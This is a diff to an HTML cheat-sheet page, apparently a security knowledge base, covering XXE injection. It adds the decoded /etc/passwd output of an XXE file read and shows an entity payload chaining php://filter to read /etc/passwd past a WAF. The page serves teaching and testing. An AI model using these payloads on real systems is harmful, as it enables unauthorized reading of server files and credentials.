@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=3ece508">
+  <link rel="stylesheet" href="/assets/style.css?v=b44808e">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1682,7 +1682,10 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 ]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
 <p>Output:</p>
-<pre class="highlight"><code>cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo...</code></pre>
+<pre class="highlight"><code>cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgo=</code></pre>
+<p>If decoded the result is:</p>
+<pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</code></pre>
 <p>Filters can be chained for WAF bypass:</p>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode|convert.base64-encode/resource=file:///etc/passwd"&gt;</code></pre>
 <p>Other available filters:</p>
@@ -1966,6 +1969,6 @@ ruby server.rb</code></pre>
       });
     });
   </script>
-  <script src="/assets/main.js?v=3ece508" defer></script>
+  <script src="/assets/main.js?v=b44808e" defer></script>
 </body>
 </html>
